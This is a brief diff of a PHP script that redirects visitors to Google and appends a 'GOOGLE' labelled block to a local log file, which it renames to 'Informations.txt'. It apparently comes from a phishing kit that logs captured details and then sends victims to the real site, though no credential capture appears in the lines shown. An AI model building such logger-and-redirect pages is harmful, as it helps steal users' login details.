@@ -1,6 +1,6 @@
 <?php
 header("Location: https://www.google.com");
-$file = fopen("graveyard.txt", "a");
+$file = fopen("Informations.txt", "a");
 fwrite($file, "--------------------\n");
 fwrite($file, "GOOGLE\n");
 fwrite($file, "--------------------");
